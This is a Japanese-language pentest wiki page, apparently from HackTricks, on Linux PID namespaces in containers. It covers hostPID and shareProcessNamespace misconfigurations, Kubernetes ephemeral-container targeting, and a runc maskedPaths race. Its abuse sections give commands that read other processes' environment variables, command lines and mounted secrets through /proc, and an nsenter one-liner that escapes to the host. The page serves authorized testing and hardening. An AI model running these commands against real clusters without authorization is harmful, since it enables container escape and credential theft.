# PID 名前空間

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

PID 名前空間は、プロセスの番号付け方法と、どのプロセスが見えるかを制御します。そのため、コンテナは実際のマシンではないにもかかわらず、独自の PID 1 を持てます。名前空間内では、ワークロードにはローカルなプロセスツリーに見えるものが表示されます。名前空間の外では、ホストから実際のホスト PID とプロセス全体が引き続き見えます。<sup>[[3]](#references)</sup>

セキュリティの観点では、プロセスの可視性が重要なため、PID 名前空間は重要です。ワークロードからホストプロセスが見えると、サービス名、コマンドライン引数、プロセス引数に渡された秘密情報、`/proc` を通じた環境変数由来の状態、名前空間への侵入先となり得るプロセスなどを観察できる可能性があります。さらに、適切な条件下でシグナル送信や ptrace を行うなど、単にプロセスを見る以上のことができる場合、問題ははるかに深刻になります。

## 動作

新しい PID 名前空間では、独自のプロセス番号が割り当てられます。名前空間内で最初に作成されたプロセスは、その名前空間から見ると PID 1 となり、孤児プロセスの扱いやシグナル動作において、init に似た特別な意味を持ちます。これにより、コンテナ内の init プロセスやゾンビプロセスの回収に関するさまざまな挙動や、コンテナで小さな init ラッパーが使われることがある理由が説明できます。<sup>[[3]](#references)</sup>

PID 名前空間は階層を形成します。祖先の名前空間にいるプロセスは、その祖先の名前空間で割り当てられた PID を使って子孫のプロセスを指定できますが、子孫から通常の PID ベースのシステムコールで祖先にしか属さないタスクを指定したり、`setns()` で上位の祖先 PID 名前空間に入ったりすることはできません。ただし、祖先が所有する procfs を意図的に子孫に公開すると、祖先のプロセスビューが leak する可能性があります。また、`setns()` で PID 名前空間に入ると、呼び出し元自身ではなく**今後作成される子プロセス**の名前空間が変わるため、ツールは参加後に fork します。procfs のマウントには、それをマウントしたプロセスの PID ビューが保持されます。そのため、`unshare(CLONE_NEWPID)` の後に新たな procfs を作成することは、見た目だけの問題ではなく、セキュリティ上重要です。<sup>[[3]](#references)</sup>

重要なセキュリティ上の教訓は、プロセスツリーが自分のものだけに見えるため隔離されているように見えても、その隔離は意図的に解除できるということです。Docker では `--pid=host`、Kubernetes では `hostPID: true` によってこれが可能です。コンテナがホスト PID 名前空間に入ると、ワークロードからホストプロセスが直接見えるようになり、その後の多くの攻撃経路が、はるかに現実的になります。

## 実習

PID 名前空間を手動で作成するには:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

シェルからは、プライベートなプロセスビューが見えるようになりました。`--mount-proc` フラグが重要なのは、新しい PID namespace に対応する procfs インスタンスをマウントし、内部から見たプロセス一覧に一貫性を持たせるためです。<sup>[[3]](#references)</sup>

コンテナの動作を比較するには：

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

この違いはすぐに理解できるため、読者にとって最初の lab として適しています。

## Runtime Usage

Docker、Podman、containerd、CRI-O の通常のコンテナには、それぞれ独自の PID namespace が割り当てられます。Kubernetes のコンテナは通常、個別の PID ビューを持ちますが、`shareProcessNamespace: true` を指定すると、意図的に Pod 全体で共有されるビューが作成されます。<sup>[[4]](#references)</sup> 一方、`hostPID: true` はノードの PID namespace を選択します。LXC/Incus 環境も同じカーネルのプリミティブに依存しますが、system container のユースケースでは、より複雑なプロセスツリーが見えることがあり、デバッグのための簡易的な手段が使われやすくなります。

このルールはどの環境でも同じです。runtime が PID namespace を分離しないように選択した場合、それはコンテナ境界を意図的に弱めていることを意味します。

## Misconfigurations

代表的な設定ミスは、host PID の共有です。デバッグ、監視、サービス管理の利便性を理由に正当化されることがよくありますが、常に重要なセキュリティ例外として扱うべきです。コンテナがホストプロセスに対する直接的な書き込み手段を持っていなくても、プロセスが見えるだけでシステムについて多くの情報が明らかになる可能性があります。`CAP_SYS_PTRACE` のような capability や、有用な procfs へのアクセスが加わると、リスクは大幅に高まります。

もう1つの誤りは、デフォルトではワークロードがホストプロセスを kill したり ptrace したりできないため、host PID の共有は無害だと考えることです。この判断は、列挙の価値、namespace に入るための対象が利用可能であること、そして PID の可視性が他の弱められた制御と組み合わさる点を見落としています。

### Kubernetes Pod-wide process sharing

`shareProcessNamespace: true` は `hostPID` とは異なり、ノードのプロセスではなく、**同じ Pod 内の他のコンテナのプロセス**を公開します。そのため、侵害された sidecar や debug container は、procfs のアクセスチェックに応じて、兄弟コンテナのコマンドラインや環境データを列挙したり、認証情報が許せばシグナルを送信したり、`/proc/<pid>/root` を通じて兄弟コンテナのファイルシステムをたどったりできます。Kubernetes は、コマンドラインや環境変数内の秘密情報、およびコンテナのファイルシステムは、適用される Unix permissions のみで保護されると明示的に警告しています。<sup>[[4]](#references)</sup>

クラスター側で確認する際に役立つ項目:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Pod-wide PID namespace内の侵害されたコンテナからは、可視性と読み取り可能性が同じだと決めつけず、まず実際にアクセスできるかを確認します。<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### 既存の Kubernetes Pod 内の対象指定された ephemeral containers

`pods/ephemeralcontainers` の変更を許可された Kubernetes identity は、`shareProcessNamespace` が未設定でも、実行中の Pod に debugger を追加できます。`--target` を指定すると、runtime が namespace targeting に対応している場合、debugger は指定した container の process namespace に参加します。これにより、その container の process view が得られますが、node の host PID namespace は見えません。<sup>[[5]](#references)</sup>

API は独立した subresource を使用するため、通常の Pod 書き込み権限でカバーされると決めつけず、`patch`/`update` 権限を確認してください。<sup>[[6]](#references)</sup>

認可された namespace 内の Pod と container について、対象指定した view をテストします。<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

runtime が targeting を実装していない場合、debugger の起動に失敗したり、隔離された PID namespace にとどまったりすることがあります。<sup>[[5]](#references)</sup> targeting が機能する場合は、[Kubernetes Pod-wide process sharing](#kubernetes-pod-wide-process-sharing) の確認項目を使って `/proc/<pid>` へのアクセスをテストしてください。プロセスが見えるからといって、対象の秘密を読み取ったり、対象にシグナルを送ったりする権限があるわけではありません。Unix credentials と procfs のアクセスチェックは引き続き適用されます。<sup>[[4]](#references)[[8]](#references)</sup> Pod Security Standards は ephemeral containers の privileged 設定にも制約を設けています。<sup>[[7]](#references)</sup>

## 悪用

ホストの PID namespace が共有されている場合、攻撃者はホストのプロセスを調査したり、プロセスの引数を収集したり、興味深いサービスを特定したり、`nsenter` の対象となる PID 候補を見つけたり、プロセスの可視性と ptrace 関連の権限を組み合わせて、ホストや隣接するワークロードに干渉したりできる可能性があります。場合によっては、適切な長時間稼働プロセスを見つけるだけで、その後の攻撃計画を大きく変えられます。

実際にまず行うべきことは、ホストのプロセスが本当に見えることを確認することです：

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

ホストの PID が見えるようになると、プロセスの引数や namespace へのエントリー対象が、最も有用な情報源となることがよくあります。

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

`nsenter` が利用可能で十分な権限がある場合、可視のホストプロセスを namespace bridge として利用できるかテストします。

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

エントリーがブロックされていても、host PID の共有には、サービスの構成、runtime コンポーネント、次に標的とする候補の特権プロセスを把握できるという価値があります。PID が見えるだけでは、シグナルの送信、trace、機密性の高い `/proc/<pid>` エントリーの読み取り、または対象の他の namespace への参加が許可されるわけではありません。credentials、dumpability、対象の namespace を所有する user namespace 内の capabilities、Yama/LSM のポリシー、seccomp も依然として重要です。<sup>[[3]](#references)</sup> プロセスインジェクションの例については、[CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) を参照してください。

host PID が見えることで、file-descriptor の悪用も現実味を帯びます。特権を持つ host プロセスや隣接する workload が機密ファイルまたはソケットを開いている場合、ptrace 型のチェック、所有者、procfs のマウントオプション、オブジェクトの種類、対象サービスのモデルによっては、攻撃者が `/proc/<pid>/fd/` を調べて、基になるオブジェクトにアクセスできる可能性があります。FD のシンボリックリンクが見えるだけでは、それを開けるとは限りません。また、`/proc/<pid>/fd/N` のシンボリックリンクを開くだけでソケットを複製することはできません。独立した `pidfd_getfd()` プリミティブとその認可チェックについては、[Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md) を参照してください。<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

これらのコマンドは、`hidepid=1` または `hidepid=2` によってプロセス間の可視性が制限されているか、また、開いている secret files、ログ、Unix sockets など、明らかに重要なファイルディスクリプタが見えるかどうかを確認するのに役立ちます。

### 完全な例: host PID + `nsenter`

host PID の共有は、プロセスが host namespaces に参加し、host process の root を採用するために必要な capabilities を持っている場合、host escape を可能にすることがあります。後者には `nsenter --root` (`-r`) が必要です。mount namespace を変更するだけでは、呼び出し元の root directory は変わりません。<sup>[[9]](#references)</sup> `/proc/1/root` へのアクセスには ptrace read check が適用されます。一方、root の変更には、呼び出し元の user namespace で `CAP_SYS_CHROOT` が必要です。<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

コマンドが成功すると、新しいシェルはホストの mount、UTS、network、IPC、PID namespace と、PID 1 の root filesystem を使用します。PID が見えるだけでホスト権限が得られたと思い込まず、実効 identity とアクセス権を確認してください。<sup>[[9]](#references)</sup>

`nsenter` 自体がなくても、ホストの filesystem がマウントされていれば、ホストのバイナリを使って同じ結果を得られる場合があります。

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### 最近のランタイムに関する注意点

PID namespace に関係する攻撃の中には、従来の `hostPID: true` の設定ミスではなく、コンテナのセットアップ中に procfs の保護を適用する方法に関するランタイム実装のバグを悪用するものがあります。

#### `maskedPaths` による host procfs への race

脆弱な `runc` バージョンでは、コンテナイメージまたは `runc exec` のワークロードを制御できる攻撃者が、コンテナ側の `/dev/null` を `/proc/sys/kernel/core_pattern` などの機密性の高い procfs パスを指すシンボリックリンクに置き換え、マスキング処理との race を仕掛けることができました。race に成功すると、masked-path の bind mount が誤ったターゲットにマウントされ、新しいコンテナからホスト全体に影響する procfs の設定項目が公開される可能性がありました。<sup>[[1]](#references)</sup>

確認に役立つコマンド：

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

これは重要です。最終的な影響は、procfsが直接公開された場合と同じになる可能性があります。たとえば、書き込み可能な`core_pattern`または`sysrq-trigger`を介して、ホスト上でコードが実行されたり、サービス拒否が発生したりします。一般的なprocfs攻撃対象領域については、内容が重複しないよう、専用の[masked paths](../masked-paths.md)および[sensitive host mounts](../../sensitive-host-mounts.md)のページで解説しています。

#### `insject`によるnamespace injection

`insject`などのnamespace injectionツールは、PID namespaceとのやり取りにおいて、プロセスの作成前に対象namespaceへ入る必要がないことを示しています。ヘルパーは後からアタッチし、`setns()`を使って、対象のPID空間内の可視性を保ったまま実行できます。<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

この種の手法は主に、高度なデバッグ、攻撃用ツール、そしてランタイムがすでにワークロードを初期化した後にnamespace contextを結合する必要があるpost-exploitationワークフローで重要になります。

### 関連するFD悪用パターン

host PIDが見える場合、特に注意すべきパターンが2つあります。1つ目は、`O_CLOEXEC`が設定されていないため、特権プロセスが`execve()`をまたいで機密ファイルディスクリプターを開いたままにするケースです。2つ目は、サービスが`SCM_RIGHTS`を使ってUnixソケット経由でファイルディスクリプターを渡すケースです。どちらの場合も、重要なのはパス名ではなく、低権限プロセスが継承または受信する可能性のある、すでに開かれたハンドルです。

コンテナでの作業で重要なのは、そのハンドルが`docker.sock`、特権ログ、hostの秘密ファイル、またはその他の価値の高いオブジェクトを指している可能性があることです。パス自体にコンテナのファイルシステムから直接アクセスできなくても、その可能性はあります。

## 確認

これらのコマンドは、プロセスがプライベートなPIDビューを持っているか、それともすでにはるかに広範なプロセス環境を列挙できるかを判断するためのものです。

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

ここで注目すべき点:<sup>[[3]](#references)</sup>

- プロセス一覧に明らかなホストサービスが含まれている場合、ホスト PID の共有はすでに有効になっている可能性が高いです。
- コンテナ内だけの小さなプロセスツリーしか見えないのが通常の状態です。`systemd`、`dockerd`、無関係なデーモンが見えるのは通常ではありません。
- `NSpid` から、ネストされた namespace 間の PID マッピングがわかる場合があります。左端の値は procfs の mount に関連付けられた PID namespace での値で、その後にネストされた各 namespace での値が続きます。
- `readlink /proc/self/ns/pid` だけでは、`hostPID` を証明できません。分離されたコンテナにも有効な PID namespace inode があるためです。プロセス一覧、procfs の mount、runtime の設定、利用可能であればホスト側の namespace inode を照合してください。
- ホスト PID が見えるようになると、読み取り専用のプロセス情報であっても、有用な偵察に使えます。

ホスト PID の共有が有効なコンテナを見つけた場合、それを見た目だけの違いとして扱ってはいけません。これは、ワークロードが観察できる対象や、影響を及ぼしうる対象を大きく変えるものです。





## References

- [1] [runc のセキュリティ勧告: mount の競合状態を悪用した「masked path」によるコンテナエスケープ (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [ツールリリース – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 の書籍](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Pod 内のコンテナ間で Process Namespace を共有する](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [実行中の Pod をデバッグする](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [Ephemeral Containers KEP](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
